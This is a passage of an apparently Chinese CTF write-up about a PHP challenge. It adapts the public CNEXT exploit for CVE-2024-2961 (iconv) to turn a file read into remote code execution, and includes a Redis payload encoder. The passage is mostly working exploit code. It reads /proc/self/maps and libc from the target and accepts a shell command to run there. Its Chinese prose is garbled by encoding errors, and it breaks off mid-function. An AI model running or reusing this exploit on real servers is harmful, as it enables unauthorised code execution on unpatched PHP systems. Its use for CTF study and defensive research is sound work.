class="hljs-string">&quot; &quot;</span>)<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += urllib.quote(redis_format(x))<br>    <span class="hljs-built_in">print</span> payload<br>    <span class="hljs-built_in">print</span> urllib.quote(<span class="hljs-string">&quot;äºŒæ¬¡urlç¼–ç åçš„ç»“æœ:\n&quot;</span> + payload)<br></code></pre></td></tr></table></figure><p>é€šè¿‡dsnå¯ä»¥è§¦å‘wrapper ä»è€Œæ¥è§¦å‘iconvçš„cveï¼Œåˆæ˜¯CVE-2024-2961â€¦â€¦</p><p>æŠŠ&#x2F;proc&#x2F;self&#x2F;mapså’Œlibcä¸‹è½½ä¸‹æ¥ï¼Œç„¶åæ”¹æ”¹iconvçš„expï¼Œæ‰‹åŠ¨æ‰“exploitï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># CNEXT: PHP file-read to RCE</span><br><span class="hljs-comment"># Date: 2024-05-27</span><br><span class="hljs-comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># TODO Parse LIBC to know if patched</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># INFORMATIONS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># REQUIREMENTS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Requires ten: https://github.com/cfreal/ten</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> annotations<br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> ChunkedEncodingError, ConnectionError<br><span class="hljs-keyword">from</span> ten <span class="hljs-keyword">import</span> *<br><br><br>HEAP_SIZE = <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br>BUG = <span class="hljs-string">&quot;åŠ„&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A helper class to send the payload and download files.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The logic of the exploit is always the same, but the exploit needs to know how to</span><br><span class="hljs-string">    download files (/proc/self/maps and libc) and how to send the payload.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The code here serves as an example that attacks a page that looks like:</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    ```php</span><br><span class="hljs-string">    &lt;?php</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span><br><span class="hljs-string">    echo &quot;File contents: $data&quot;;</span><br><span class="hljs-string">    ```</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    Tweak it to fit your target, and start the exploit.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url, data=&#123;<span class="hljs-string">&quot;pdo&quot;</span>: path&#125;)<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        response = <span class="hljs-variable language_">self</span>.send(path)<br>        data = response.re.search(<span class="hljs-string">b&quot;File contents: (.*)&quot;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> base64.decode(data)<br><br><span class="hljs-meta">@entry</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;Target URL&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;sleep_time&quot;</span>, <span class="hljs-string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;heap&quot;</span>, <span class="hljs-string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;pad&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta"></span>)</span><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span><br><br>    url: <span class="hljs-built_in">str</span><br>    command: <span class="hljs-built_in">str</span><br>    sleep: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span><br>    heap: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span><br>    pad: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__post_init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.remote = Remote(<span class="hljs-variable language_">self</span>.url)<br>        <span class="hljs-variable language_">self</span>.log = logger(<span class="hljs-string">&quot;EXPLOIT&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.info = &#123;&#125;<br>        <span class="hljs-variable language_">self</span>.heap = <span class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.heap, <span class="hljs-number">16</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vulnerable</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span><br><span class="hljs-string">        wrappers and filters that the exploit needs.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_download</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br>            <span class="hljs-keyword">except</span> ConnectionError:<br>                failure(<span class="hljs-string">&quot;Target not [b]reachable[/] ?&quot;</span>)<br>            <br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_token</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span>, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>            result = safe_download(path)<br>            <span class="hljs-keyword">return</span> text.encode() == result<br><br>        text = tf.random.string(<span class="hljs-number">50</span>).encode()<br>        base64 = b64(text, misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br><br>        result = safe_download(path)<br>        <br>        <span class="hljs-keyword">if</span> text <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            msg_failure(<span class="hljs-string">&quot;Remote.download did not return the test string&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Expected test string: <span class="hljs-subst">&#123;text&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Got: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            failure(<span class="hljs-string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]data://[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(text.encode(), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter//resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(compress(text.encode()), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)<br><br>        msg_success(<span class="hljs-string">&quot;Exploit preconditions are satisfied&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">with</span> msg_status(<span class="hljs-string">f&quot;Downloading [i]<span class="hljs-subst">&#123;path&#125;</span>[/]...&quot;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_regions</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">list</span>[Region]:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;maps&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            maps = f.read()<br>        maps = maps.decode()<br>        PATTERN = re.<span class="hljs-built_in">compile</span>(<br>            <span class="hljs-string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="hljs-string">r&quot;.*&quot;</span> <span class="hljs-string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="hljs-string">r&quot;(.*)&quot;</span><br>        )<br>        regions = []<br><br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> table.split(maps, strip=<span class="hljs-literal">True</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> := PATTERN.<span class="hljs-keyword">match</span>(region):<br>                start = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>)<br>                stop = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>                permissions = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)<br>                path = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;[&quot;</span> <span class="hljs-keyword">in</span> path:<br>                    path = path.rsplit(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>]<br>                <span class="hljs-keyword">else</span>:<br>                    path = <span class="hljs-string">&quot;&quot;</span><br>                current = Region(start, stop, permissions, path)<br>                regions.append(current)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(maps)<br>                failure(<span class="hljs-string">&quot;Unable to parse memory mappings&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.log.info(<span class="hljs-string">f&quot;Got <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)<br>        <span class="hljs-built_in">print</span>(regions)<br>        <span class="hljs-keyword">return</span> regions<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_symbols_and_addresses</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span><br>        regions = <span class="hljs-variable language_">self</span>.get_regions()<br><br>        LIBC_FILE = <span class="hljs-string">&quot;F:\\zzzworkings\\CTF\\races\\JQCTF_final\\photocms\\exp\\libc-2.27.so&quot;</span><br><br>        <span class="hljs-comment"># PHP&#x27;s heap</span><br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>] = <span class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.find_main_heap(regions)<br><br>        <span class="hljs-comment"># Libc</span><br><br>        libc = <span class="hljs-variable language_">self</span>._get_region(regions, <span class="hljs-string">&quot;libc-2&quot;</span>, <span class="hljs-string">&quot;libc.so&quot;</span>)<br><br>        <span class="hljs-comment">#self.download_file(libc.path, LIBC_FILE)</span><br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment">#self.info[&quot;libc&quot;] = ELF(&quot;libc-2.31.so&quot;, checksec=False)</span><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>].address = libc.start<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_region</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region], *names: <span class="hljs-built_in">str</span></span>) -&gt; Region:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> regions:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(name <span class="hljs-keyword">in</span> region.path <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names):<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            failure(<span class="hljs-string">&quot;Unable to locate region&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> region<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">self, remote_path: <span class="hljs-built_in">str</span>, local_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span><br>        data = <span class="hljs-variable language_">self</span>.get_file(remote_path)<br>        <span class="hljs-comment">#print(data)</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(local_path,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(data)<br>        